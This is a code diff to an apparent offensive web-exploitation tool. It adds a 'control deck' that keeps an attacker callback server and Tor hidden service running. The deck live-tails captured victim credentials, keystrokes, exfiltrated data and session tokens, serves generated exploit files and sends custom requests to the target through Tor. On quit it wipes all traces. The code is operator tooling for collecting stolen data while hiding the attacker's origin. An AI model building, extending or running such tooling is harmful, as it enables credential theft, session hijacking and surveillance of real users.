@@ -3171,26 +3171,60 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
         print(f"  {i+1:>3}  {color}[{sev:6}]{N}  {etype:20}  {v.get('title', '?')[:45]}")
     print()
 
-    sel = prompt("Enter number (or 'all' for sequential, 'q' to quit)", "all")
-    if sel.lower() in ("q", "quit"):
-        return client, executor
+    findings_summary: list = []
+    chain_data: dict = {}
 
-    if sel.isdigit():
+    # First pass: let the operator pick which findings to run up front.
+    sel = prompt("Enter number (or 'all' for sequential, 'q' to skip directly "
+                 "to control deck)", "all")
+    if sel.lower() in ("q", "quit"):
+        targets: list = []
+    elif sel.isdigit():
         idx = int(sel) - 1
         if 0 <= idx < len(exploitable):
             targets = [exploitable[idx]]
         else:
             err(f"Invalid number: {sel}")
-            return client, executor
+            targets = []
     else:
-        targets = exploitable
+        targets = list(exploitable)
 
-    findings_summary = []
-    chain_data = {}
+    if targets:
+        _run_findings_loop(
+            targets, exploitable, base_url, _sp, attacker_url,
+            executor, file_mgr, server, audit, chain_data,
+            preset, auto_mode, callback_urls, infra_is_loopback,
+            findings_summary,
+        )
 
+    # Control deck: keep the session live until the operator explicitly
+    # tears it down. Previously the walkthrough auto-ran
+    # _walkthrough_session_end() which printed a report and fell
+    # through to the finally: block that stopped the server + wiped
+    # every generated file. Operators lost access to their live
+    # capture stream and their pre-generated payload files the instant
+    # the last finding finished. Now the control deck stays up until
+    # 'q' is selected.
+    _walkthrough_control_deck(
+        exploitable, base_url, _sp, attacker_url,
+        executor, file_mgr, server, audit, chain_data,
+        preset, auto_mode, callback_urls, infra_is_loopback,
+        findings_summary,
+    )
+
+    return client, executor
+
+
+def _run_findings_loop(targets, exploitable, base_url, _sp,
+                        attacker_url, executor, file_mgr, server,
+                        audit, chain_data, preset, auto_mode,
+                        callback_urls, infra_is_loopback,
+                        findings_summary) -> bool:
+    """Run a batch of findings through _run_steps_smart. Returns True
+    if the operator requested a hard quit (from inside a step)."""
     for vi, v in enumerate(targets):
         if shutdown_requested():
-            break
+            return True
         file_mgr.cleanup_expired()
 
         sev = v.get("severity", "?")
@@ -3204,10 +3238,12 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
         param = ei.get("parameter", "")
         test_url = v.get("test_url") or base_url
 
-        findings_summary.append({
-            "severity": sev, "type": etype,
-            "title": v.get("title", "?")[:60],
-        })
+        if not any(f.get("title") == v.get("title", "?")[:60] and
+                   f.get("type") == etype for f in findings_summary):
+            findings_summary.append({
+                "severity": sev, "type": etype,
+                "title": v.get("title", "?")[:60],
+            })
         audit.log("finding_start", f"{etype}: {v.get('title', '?')[:50]}",
                   vuln_type=etype, risk=sev)
 
@@ -3236,7 +3272,7 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
             infra_is_loopback=infra_is_loopback)
 
         if quit_requested:
-            break
+            return True
 
         if len(targets) > 1 and vi < len(targets) - 1:
             print()
@@ -3245,12 +3281,301 @@ def _walkthrough_main(exploitable, vulns, tor_proxy, auto_mode,
                   f"{stats['files_generated']} files, "
                   f"{stats['skips']} skip]{N}")
             if not confirm("Continue to next finding?"):
+                return False
+    return False
+
+
+def _walkthrough_control_deck(exploitable, base_url, _sp,
+                               attacker_url, executor, file_mgr,
+                               server, audit, chain_data, preset,
+                               auto_mode, callback_urls,
+                               infra_is_loopback, findings_summary):
+    """Post-run control center. Keeps the attacker server + hidden
+    service + generated files alive and lets the operator:
+      R   re-run a finding (pick index)
+      P   pick another finding
+      L   live-tail captures from the attacker server
+      C   run an ad-hoc authenticated request against the target
+      A   show audit log + stats
+      F   list generated exploit files (with serve URLs)
+      U   show all callback URLs again (with labels)
+      T   toggle auto-mode for subsequent findings
+      S   stop the attacker server (with confirmation)
+      G   generate + view a session report
+      Q   quit + wipe everything
+    """
+    _KIND_LABELS = {
+        "c": "credentials",
+        "x": "exfil",
+        "k": "keylog",
+        "s": "session",
+        "b": "beacon",
+    }
+    _already_reported = False
+
+    while True:
+        if shutdown_requested():
+            break
+        print()
+        heading("Control Deck")
+        stats = audit.get_stats()
+        cap_count = server.capture_count() if server.is_running else 0
+        _onion = server.onion_host if server and server.is_running else None
+        server_state = (
+            f"{G}RUNNING{N}" if server and server.is_running
+            else f"{R}STOPPED{N}"
+        )
+        print(f"  {B}Server:{N}      {server_state}  "
+              f"{'('+ _onion +')' if _onion else '(loopback-only)' if infra_is_loopback else ''}")
+        print(f"  {B}Captures:{N}    {cap_count}")
+        print(f"  {B}Executions:{N}  {stats['executions']} "
+              f"({stats['successes']} ok, {stats['failures']} fail)")
+        print(f"  {B}Files:{N}       "
+              f"{len([f for f in file_mgr.list_files() if f['exists']])} active")
+        print(f"  {B}Auto-mode:{N}   {'ON' if auto_mode else 'off'}")
+        print()
+        print(f"  {G}R{N}  Re-run a finding       "
+              f"{G}P{N}  Pick another finding")
+        print(f"  {G}L{N}  Live capture viewer    "
+              f"{G}C{N}  Run custom request")
+        print(f"  {G}A{N}  Audit log + stats      "
+              f"{G}F{N}  List generated files")
+        print(f"  {G}U{N}  Show callback URLs     "
+              f"{G}T{N}  Toggle auto-mode")
+        print(f"  {G}G{N}  Generate report        "
+              f"{G}S{N}  Stop attacker server")
+        print(f"  {G}Q{N}  Quit + wipe everything")
+        print()
+        cmd = prompt("Control deck", "Q").strip().upper()
+        if not cmd:
+            cmd = "Q"
+
+        if cmd == "Q":
+            if server and server.is_running and cap_count > 0:
+                warn(f"{cap_count} captured callback(s) will be wiped on quit.")
+                if not confirm("Really quit and wipe everything?"):
+                    continue
+            elif not _already_reported and len(findings_summary) > 0:
+                if confirm("Generate session report before wiping?"):
+                    _generate_and_show_report(
+                        audit, file_mgr, findings_summary, server)
+                    _already_reported = True
+            break
+
+        elif cmd in ("R", "P"):
+            if not exploitable:
+                warn("No findings available to re-run.")
+                continue
+            print()
+            print(f"  {'#':>3}  {'Sev':8}  {'Type':20}  Title")
+            print(f"  {'─' * 70}")
+            for i, v in enumerate(exploitable):
+                sev = v.get("severity", "?")
+                etype = v.get("exploit_info", {}).get("type", "?")
+                color = {"CRITICAL": R, "HIGH": R, "MEDIUM": Y,
+                         "LOW": C}.get(sev, D)
+                print(f"  {i+1:>3}  {color}[{sev:6}]{N}  {etype:20}  "
+                      f"{v.get('title', '?')[:45]}")
+            print()
+            sel = prompt("Finding # (or blank to cancel)", "").strip()
+            if not sel:
+                continue
+            if sel.lower() == "all":
+                targets = list(exploitable)
+            elif sel.isdigit() and 1 <= int(sel) <= len(exploitable):
+                targets = [exploitable[int(sel) - 1]]
+            else:
+                err(f"Invalid selection: {sel}")
+                continue
+            _run_findings_loop(
+                targets, exploitable, base_url, _sp, attacker_url,
+                executor, file_mgr, server, audit, chain_data,
+                preset, auto_mode, callback_urls, infra_is_loopback,
+                findings_summary,
+            )
+
+        elif cmd == "L":
+            _live_capture_viewer(server)
+
+        elif cmd == "C":
+            _control_deck_custom_request(executor, attacker_url,
+                                          callback_urls, chain_data)
+
+        elif cmd == "A":
+            print()
+            stats = audit.get_stats()
+            print(f"  {B}Session:{N}      {stats['session_id']}")
+            print(f"  {B}Duration:{N}     {stats['duration_seconds']}s")
+            print(f"  {B}Executions:{N}   {stats['executions']} "
+                  f"({stats['successes']} ok, {stats['failures']} fail)")
+            print(f"  {B}Skipped:{N}      {stats['skips']}")
+            print(f"  {B}Files gen:{N}    {stats['files_generated']}")
+            print(f"  {B}Alerts:{N}       {stats['alerts']}")
+            if stats.get("vuln_types_tested"):
+                print(f"  {B}Vuln types:{N}   "
+                      f"{', '.join(stats['vuln_types_tested'])}")
+            print()
+            feed = audit.get_live_feed(last_n=40)
+            if not feed:
+                info("Audit log is empty.")
+            else:
+                print(f"  {B}Last {len(feed)} entries:{N}")
+                for e in feed:
+                    risk = e.get("risk", "")
+                    risk_tag = f" [{risk}]" if risk else ""
+                    status = ""
+                    if e.get("success") is True:
+                        status = f" {G}OK{N}"
+                    elif e.get("success") is False:
+                        status = f" {R}FAIL{N}"
+                    print(f"    [{e['ts_iso']}] {e['action']:14s}{risk_tag} "
+                          f"{e.get('detail', '')[:60]}{status}")
+            print()
+
+        elif cmd == "F":
+            tracked = file_mgr.list_files()
+            active = [f for f in tracked if f["exists"]]
+            print()
+            if not active:
+                info("No active exploit files.")
+                continue
+            print(f"  {B}Active Exploit Files ({len(active)}):{N}")
+            for f in active:
+                serve_info = ""
+                if server and server.is_running:
+                    try:
+                        serve_info = f"  {D}→ {server.get_url(f['filename'])}{N}"
+                    except RuntimeError:
+                        serve_info = f"  {D}(server not running){N}"
+                print(f"    {G}●{N} {f['filename']:30s} {f['type']:12s} "
+                      f"{f['size_bytes']:>5d}B{serve_info}")
+
+        elif cmd == "U":
+            if not server.is_running:
+                warn("Server is stopped — callback URLs are no longer live.")
+                continue
+            print()
+            info(f"Attacker base: {attacker_url}")
+            info("Callback endpoints (each has its own HMAC-derived token):")
+            for _k in "cxksb":
+                _url = callback_urls.get(_k) or server.get_callback_url(_k)
+                info(f"  /{_k} ({_KIND_LABELS[_k]:<12s}) {_url}")
+
+        elif cmd == "T":
+            auto_mode = not auto_mode
+            info(f"Auto-mode is now {'ON' if auto_mode else 'off'}")
+
+        elif cmd == "G":
+            _generate_and_show_report(audit, file_mgr, findings_summary, server)
+            _already_reported = True
+
+        elif cmd == "S":
+            if not server.is_running:
+                warn("Server is already stopped.")
+                continue
+            _cap = server.capture_count()
+            if _cap > 0:
+                warn(f"Stopping the server discards {_cap} captured "
+                     "callback(s).")
+            if not confirm("Stop the attacker server now?"):
+                continue
+            server.stop()
+            ok("Attacker server stopped.")
+
+        else:
+            warn(f"Unknown command: {cmd}")
+
+
+def _live_capture_viewer(server):
+    """Live-tail new callbacks as they arrive. Exits on empty-line /
+    Enter / Ctrl-C. Never blocks the control deck for more than the
+    poll interval when no captures arrive."""
+    if not server or not server.is_running:
+        warn("Server is not running — nothing to tail.")
+        return
+    _kc = {"credentials": R, "keylog": Y, "exfil": M, "session": R, "beacon": C}
+    start = _time_mod.time()
+    seen_count = server.capture_count()
+    print()
+    info("Live capture viewer. Press Ctrl-C to exit.")
+    info(f"{seen_count} capture(s) already in buffer — showing new arrivals only.")
+    try:
+        while True:
+            if shutdown_requested():
                 break
+            cur = server.capture_count()
+            if cur > seen_count:
+                new_items = server.get_captures(last_n=cur - seen_count)
+                # get_captures returns reversed-newest-first; reverse
+                # again so we print oldest of the batch first.
+                for cap in reversed(new_items):
+                    ep_color = _kc.get(cap.get("kind", ""), D)
+                    remote = cap.get("remote", "")[:39]
+                    body = (cap.get("data") or cap.get("query")
+                            or "")[:120].replace("\n", "\\n")
+                    print(f"  [{cap['time']}] {ep_color}{cap['method']:4s} "
+                          f"{cap['endpoint']:2s}{N} from {remote} | {body}")
+                seen_count = cur
+            _time_mod.sleep(0.6)
+    except KeyboardInterrupt:
+        pass
+    print()
+    info(f"Tailed for {_time_mod.time()-start:.1f}s, "
+         f"buffer now {server.capture_count()}.")
 
-    _walkthrough_session_end(file_mgr, audit, executor, findings_summary,
-                             server)
 
-    return client, executor
+def _control_deck_custom_request(executor, attacker_url,
+                                   callback_urls, chain_data):
+    """Let the operator run an ad-hoc request against the target
+    through the StepExecutor (so it honors Tor + jitter + audit).
+    Placeholders [ATTACKER] / [ATTACKER]/c etc. are substituted."""
+    if executor is None:
+        warn("No step executor available — the walkthrough did not start "
+             "a target client.")
+        return
+    print()
+    method = prompt("Method (GET/POST/HEAD)", "GET").strip().upper()
+    if method not in ("GET", "POST", "HEAD", "PUT", "DELETE", "PATCH"):
+        err(f"Unsupported method: {method}")
+        return
+    url = prompt("URL (placeholders [ATTACKER], [ATTACKER]/c, …)", "").strip()
+    if not url:
+        return
+    url = _subst_attacker(url, attacker_url, callback_urls=callback_urls)
+    data = ""
+    if method in ("POST", "PUT", "PATCH"):
+        data = prompt("Body (blank for none)", "")
+        data = _subst_attacker(data, attacker_url, callback_urls=callback_urls)
+    req = {"method": method, "url": url}
+    if data:
+        req["data"] = data
+    step = {"title": "Control-deck custom request", "request": req}
+    try:
+        executor.execute_step(step, vuln_type="custom")
+    except Exception as _e:
+        err(f"Request failed: {type(_e).__name__}: {_e}")
+
+
+def _generate_and_show_report(audit, file_mgr, findings_summary, server):
+    """Extracted from _walkthrough_session_end so the control deck
+    can regenerate on demand."""
+    fmt = prompt("Format (text/json)", "text").strip().lower()
+    if fmt not in ("text", "json"):
+        fmt = "text"
+    report_content = ReportGenerator.generate(
+        audit, file_mgr, fmt=fmt,
+        findings_summary=findings_summary,
+        server=server,
+    )
+    report_path = ReportGenerator.save_report(
+        report_content, file_mgr, fmt=fmt,
+    )
+    ok(f"Report saved: {report_path.name} (ephemeral, auto-wipes)")
+    print()
+    if confirm("Display report now?"):
+        print()
+        print(report_content)
+        print()
 
 
 def _pre_generate_all_files(exploitable, base_url, sp, attacker_url,
